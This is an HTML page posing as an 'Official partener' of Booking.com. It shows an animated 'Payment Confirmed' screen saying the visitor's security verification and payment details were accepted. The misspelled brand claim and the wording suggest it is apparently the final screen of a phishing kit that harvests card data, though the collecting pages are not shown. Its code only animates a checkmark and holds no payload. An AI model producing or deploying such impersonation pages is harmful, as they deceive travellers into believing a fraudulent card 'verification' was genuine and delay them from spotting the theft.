<!DOCTYPE html>
<html lang="en" translate="yes">
<head>
  <title>Booking.com | Official partener</title>
  <link rel="icon" type="image/svg+xml" href="favicon.svg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google" content="translate">
  <meta http-equiv="Content-Language" content="en">
  <style>
    body {
      margin: 0;
      background: #f5f7fa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      color: #1f2937;
    }

    .topbar {
      background: #013b95;
      color: white;
      padding: 15px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .brand {
      font-size: 22px;
      font-weight: 700;
      letter-spacing: -0.3px;
    }

    .page {
      min-height: calc(100vh - 56px);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 28px 16px;
      box-sizing: border-box;
    }

    .panel {
      width: 100%;
      max-width: 560px;
      background: white;
      padding: 30px 28px;
      border-radius: 16px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.08);
      text-align: center;
    }

    .progress {
      font-size: 13px;
      color: #6b7280;
      margin-bottom: 24px;
      text-align: left;
    }

    .bar {
      display: flex;
      gap: 6px;
      margin-top: 8px;
    }

    .bar div {
      flex: 1;
      height: 4px;
      border-radius: 2px;
      background: #e5e7eb;
    }

    .bar .active {
      background: #0071c2;
    }

    .container {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      background: #e6f4ea;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow:
        0 8px 20px rgba(0,0,0,0.06),
        inset 0 1px 0 rgba(255,255,255,0.6);
      animation: enter 0.6s cubic-bezier(0.22, 1, 0.36, 1);
      margin: 6px auto 24px;
    }

    svg {
      width: 64px;
      height: 64px;
    }

    .circle {
      fill: none;
      stroke: #2e7d32;
      stroke-width: 2;
      opacity: 0.25;
      stroke-dasharray: 63;
      stroke-dashoffset: 63;
      animation: circleDraw 1s cubic-bezier(0.22, 1, 0.36, 1) forwards;
    }

    .check {
      fill: none;
      stroke: #2e7d32;
      stroke-width: 3;
      stroke-linecap: round;
      stroke-linejoin: round;
      stroke-dasharray: 32;
      stroke-dashoffset: 32;
      animation: checkDraw 0.7s cubic-bezier(0.22, 1, 0.36, 1) forwards;
      animation-delay: 0.75s;
    }

    .container.finish {
      animation: settle 0.4s ease-out 1.1s forwards;
    }

    h1 {
      margin: 0 0 12px;
      font-size: 30px;
      line-height: 1.15;
      color: #111827;
    }

    .lead {
      margin: 0 auto 22px;
      max-width: 420px;
      font-size: 15px;
      line-height: 1.7;
      color: #4b5563;
    }

    .success-box {
      background: #f0fdf4;
      border: 1px solid #bbf7d0;
      border-radius: 12px;
      padding: 16px;
      margin: 0 auto;
      max-width: 440px;
      font-size: 14px;
      line-height: 1.6;
      color: #166534;
    }

    .secure {
      text-align: center;
      font-size: 13px;
      color: #777;
      margin-top: 18px;
    }

    .message {
      opacity: 0;
      transform: translateY(10px);
      transition: opacity 0.45s ease, transform 0.45s ease;
    }

    .message.show {
      opacity: 1;
      transform: translateY(0);
    }

    @keyframes enter {
      0% {
        transform: scale(0.88);
        opacity: 0;
      }
      100% {
        transform: scale(1);
        opacity: 1;
      }
    }

    @keyframes circleDraw {
      to {
        stroke-dashoffset: 0;
      }
    }

    @keyframes checkDraw {
      to {
        stroke-dashoffset: 0;
      }
    }

    @keyframes settle {
      0% { transform: scale(1); }
      40% { transform: scale(1.06); }
      100% { transform: scale(1); }
    }

    @media (max-width: 560px) {
      .panel {
        padding: 24px 20px;
        border-radius: 0;
        box-shadow: none;
      }

      h1 {
        font-size: 26px;
      }
    }
  </style>
</head>
<body>

  <div class="page">
    <div class="panel">

      <div class="container" id="success">
        <svg viewBox="0 0 24 24">
          <circle class="circle" cx="12" cy="12" r="10"/>
          <path class="check" d="M6.5 12.5 L10 16 L17.5 8.5"/>
        </svg>
      </div>

      <div class="message" id="successMessage">
        <h1>Payment Confirmed</h1>
        <p class="lead">
          Your security verification has been completed successfully and your payment details were confirmed.
        </p>

        <div class="success-box">
          Thank you. Your confirmation has been received successfully. You may now safely close this page.
        </div>

        <div class="secure">Secure booking confirmation</div>
      </div>
    </div>
  </div>

  <script>
    setTimeout(() => {
      document.getElementById('success').classList.add('finish');
    }, 1400);

    setTimeout(() => {
      document.getElementById('successMessage').classList.add('show');
    }, 1850);
  </script>
</body>
</html>
